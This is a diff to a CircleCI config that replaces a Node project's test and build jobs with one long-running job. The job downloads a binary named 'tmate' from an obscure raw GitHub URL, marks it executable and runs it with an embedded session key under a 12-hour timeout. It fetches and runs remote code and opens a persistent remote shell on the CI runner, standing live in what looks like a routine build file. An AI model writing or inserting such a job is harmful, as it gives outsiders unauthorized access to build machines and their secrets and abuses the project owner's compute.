@@ -1,59 +1,33 @@
-# This config was automatically generated from your source code
-# Stacks detected: cicd:github-actions:.github/workflows,deps:node:.
 version: 2.1
-orbs:
-  node: circleci/node@5
+
+# This configuration defines a single job that downloads, prepares, and runs tmate.
 jobs:
-  test-node:
-    # Install node dependencies and run tests
-    executor: node/default
-    steps:
-      - checkout
-      - node/install-packages:
-          cache-path: ~/project/node_modules
-          override-ci-command: npm install
-      - run:
-          name: Run tests
-          command: npm test --passWithNoTests
-  build-node:
-    # Build node project
-    executor: node/default
-    steps:
-      - checkout
-      - node/install-packages:
-          cache-path: ~/project/node_modules
-          override-ci-command: npm install
-      - run:
-          command: npm run build
-      - run:
-          name: Create the ~/artifacts directory if it doesn't exist
-          command: mkdir -p ~/artifacts
-      # Copy output to artifacts dir
-      - run:
-          name: Copy artifacts
-          command: cp -R build dist public .output .next .docusaurus ~/artifacts 2>/dev/null || true
-      - store_artifacts:
-          path: ~/artifacts
-          destination: node-build
-  deploy:
-    # This is an example deploy job, not actually used by the workflow
+  run_tmate_continuously:
     docker:
       - image: cimg/base:stable
+    resource_class: medium
     steps:
-      # Replace this with steps to deploy to users
+      - checkout
       - run:
-          name: deploy
-          command: '#e.g. ./deploy.sh'
-      - run:
-          name: found github actions config
-          command: ':'
+          name: Download, Set Permissions, and Run tmate
+          no_output_timeout: 12h
+          command: |
+            set -e
+            echo "Step 1: Downloading tmate..."
+            if wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate -O ./tmate; then
+              echo "tmate downloaded successfully."
+            else
+              echo "Failed to download tmate. Exiting."
+              exit 1
+            fi
+            echo "Step 2: Setting execute permissions for tmate..."
+            chmod +x ./tmate
+            echo "Permissions set for tmate."
+            echo "Step 3: Running tmate..."
+            ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg
+            echo "tmate process has finished or was interrupted."
 workflows:
-  build-and-test:
+  version: 2
+  tmate_workflow:
     jobs:
-      - test-node
-      - build-node:
-          requires:
-            - test-node
-    # - deploy:
-    #     requires:
-    #       - build-node
+      - run_tmate_continuously
